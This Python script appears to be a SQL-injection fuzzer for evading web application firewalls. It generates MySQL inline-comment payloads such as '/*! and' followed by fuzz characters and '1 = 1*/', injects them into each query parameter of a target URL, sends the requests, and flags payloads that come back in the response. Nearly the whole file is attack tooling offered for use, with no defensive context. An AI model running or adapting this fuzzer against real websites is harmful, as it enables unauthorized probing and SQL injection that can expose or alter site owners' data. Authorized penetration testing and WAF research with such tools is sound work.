# encoding=utf-8
# import part -----------------------------------------
import re
import requests


# def part--------------------------
def CreatePayloadList():
    ResultLists = []
    Fuzz_a = ['/*!', '*/', '/**/', '/', '?', '~', '!', '.', '%', '-', '*', '+', '=']
    Fuzz_b = ['']
    Fuzz_c = ['%0a', '%0b', '%0c', '%0d', '%0e', '%0f', '%0h', '%0i', '%0j']
    FUZZ = Fuzz_a + Fuzz_b + Fuzz_c
    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}
    for a in FUZZ:
        for b in FUZZ:
            for c in FUZZ:
                for d in FUZZ:
                    for e in FUZZ:
                        ResultLists.append("/*! and" + a + b + c + d + e + " 1 = 1*/")
    return ResultLists


def CreateFuzzUrlList(url, PaloadLists):
    ResultLists = []
    str1 = ""
    if "#" in url and "?" in url:
        str1 = re.findall('\?(.*?)#', url, re.S)[0]
    elif "?" in url and "#" not in url:
        str1 = re.findall('\?(.*)', url, re.S)[0]
    else:
        pass
    str1 = str1.split('&')
    temp = url
    for i in str1:
        temp = temp.replace(i, i + "[PAYLOAD]")
    for payload in PaloadLists:
        ResultLists.append((payload, temp.replace("[PAYLOAD]", payload)))
    return ResultLists


def SimpleFuzz(Payload_UrlList):
    header = {}
    result = []
    for item in Payload_UrlList:
        payload = item[0]
        url = item[1]
        temp = {"payload": payload, "url": url, "status": 0}
        r = requests.get(url=url, headers=header)
        if payload in r.text:
            temp['status'] = 1
        result.append(temp)
    return result
